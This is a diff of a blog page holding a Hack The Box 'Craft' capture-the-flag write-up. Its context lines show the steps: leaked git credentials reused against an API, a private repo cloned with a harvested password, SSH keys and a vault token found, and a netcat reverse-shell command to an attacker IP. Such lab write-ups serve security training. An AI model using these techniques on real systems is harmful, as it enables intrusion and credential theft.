@@ -151,6 +151,20 @@ $ nmap -sV -sT -sC craft.htb Starting Nmap 7." />
     
     #<a href="/tags/craft/">craft</a>&nbsp;
     
+    #<a href="/tags/gogs/">gogs</a>&nbsp;
+    
+    #<a href="/tags/api/">api</a>&nbsp;
+    
+    #<a href="/tags/flask/">flask</a>&nbsp;
+    
+    #<a href="/tags/python/">python</a>&nbsp;
+    
+    #<a href="/tags/eval/">eval</a>&nbsp;
+    
+    #<a href="/tags/git/">git</a>&nbsp;
+    
+    #<a href="/tags/vault/">vault</a>&nbsp;
+    
   </span>
   
 
@@ -179,7 +193,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.15 seconds
 </code></pre></div><p>We have a classical web app running on port 443 and the ssh port 22 open.</p>
 <p>Opening <a href="http://craft.htb">http://craft.htb</a> display the following website :</p>
-<!-- raw HTML omitted -->
+<p><img src="https://user-images.githubusercontent.com/9076747/67158804-0db48600-f33d-11e9-98f1-b10407a44179.png" alt="Craft Website"></p>
 <p>This website is super simple but give us two valuable information:</p>
 <ul>
 <li>A <code>gogs</code> instance running (<code>gogs</code> is a self-hosted Git service written in Go) at <a href="https://gogs.craft.htb/">https://gogs.craft.htb/</a></li>
@@ -189,9 +203,9 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.110 gogs.craft.htb&#34;</span> &gt;&gt; /etc/hosts
 $ echo <span style="color:#e6db74">&#34;10.10.10.110 api.craft.htb&#34;</span> &gt;&gt; /etc/hosts
 </code></pre></div><p>Following this, <code>gogs.craft.htb</code> displays:</p>
-<!-- raw HTML omitted -->
+<p><img src="https://user-images.githubusercontent.com/9076747/67158918-b8797400-f33e-11e9-9223-2ac64d958595.png" alt="Gogs instance Craft website"></p>
 <p>and <code>api.craft.htb</code> displays:</p>
-<!-- raw HTML omitted -->
+<p><img src="https://user-images.githubusercontent.com/9076747/67158927-c8915380-f33e-11e9-8c59-cc2973c76cfd.png" alt="Craft API website"></p>
 <p>We have the source code and the documentation of the API. That will surely be our entry point.</p>
 <p>Out of curiosity I checked for exploit on <code>Gogs</code> and found CVE-2018-18925 and CVE-2018-20303:</p>
 <blockquote>
@@ -238,7 +252,7 @@ craft-api/craft_api/api/brew/endpoints/brew.py:        <span style="color:#66d9e
 <p>Since we have access to the git repository, we can try to exploit common flaw found in git/svn repositories. The most common issue is developers accidentally push API keys, token or password to the repository.</p>
 <p>There is a few good tools like <a href="https://github.com/dxa4481/truffleHog">truffleHog</a> or <a href="https://github.com/awslabs/git-secrets">git-secrets</a> allows to automatically retrieve secrets and credentials accidentally committed.</p>
 <p>Since there is only 6 commits in history we can manually review them to make sure we don't forget anything. At commit <code>a2d28ed155</code> we find an interesting cleanup:</p>
-<!-- raw HTML omitted -->
+<p><img src="https://user-images.githubusercontent.com/9076747/67160472-668e1980-f351-11e9-8cb2-f2f49bae0833.png" alt="Commit cleanup"></p>
 <p>Let's try to use those credentials to authenticate to the API:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/login&#34;</span> -k --user dinesh:4aUh0A8PbVJxgd
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&#34;</span><span style="color:#f92672">}</span>
@@ -356,7 +370,7 @@ BusyBox v1.29.3 (2019-01-24 07:45:07 UTC) multi-call binary.
 Usage: nc [OPTIONS] HOST PORT  - connect
 nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen
 
-	-e PROG	Run PROG after connect (must be last)
+    -e PROG    Run PROG after connect (must be last)
    [...]
 </code></pre><p><em>In this version <code>-e</code> option <strong>must be last</strong>. So if we ran <code>nc 10.10.10.85 8585 -e /bin/sh</code> instead of <code>nc -e /bin/sh 10.10.10.85 8585</code> the command would have succeeded perfectly. I tried and it worked. Odd but good to keep in mind for the future.</em></p>
 <h2 id="pivot-from-docker-container-to-user">Pivot from docker container to user</h2>
@@ -417,7 +431,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <li>Won't be useful as API credentials</li>
 </ul>
 <p>So what remains is to go back to the Gogs instance. Login as <code>gilfoyle</code> gives us access to a very interesting private repository:</p>
-<!-- raw HTML omitted -->
+<p><img src="https://user-images.githubusercontent.com/9076747/67162678-94318d80-f366-11e9-9377-04c310d8654a.png" alt="Craft Infra Repository"></p>
 <p>Let's clone it to explore it :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git
 </code></pre></div><p>First thing that catches the eye is the <code>.ssh</code> folder containing both the public and private key. We should be able to use to login as <code>gilfoyle</code> through SSH:</p>
@@ -456,7 +470,7 @@ PermitRootLogin yes
 </code></pre></div><p>It looks like our entry door for root flag will be through ssh.</p>
 <p>Inspecting files in the home directory also shows a token that might be useful:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ ls -a
-.  ..  .bashrc	.config  .gnupg  .profile  .ssh  user.txt  .vault-token  .viminfo
+.  ..  .bashrc    .config  .gnupg  .profile  .ssh  user.txt  .vault-token  .viminfo
 gilfoyle@craft:~$ cat .vault-token
 f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
 </code></pre></div><p>We notice this is about Vault again, we saw it already in the <code>craft-infra</code> repository. Let's dig.</p>
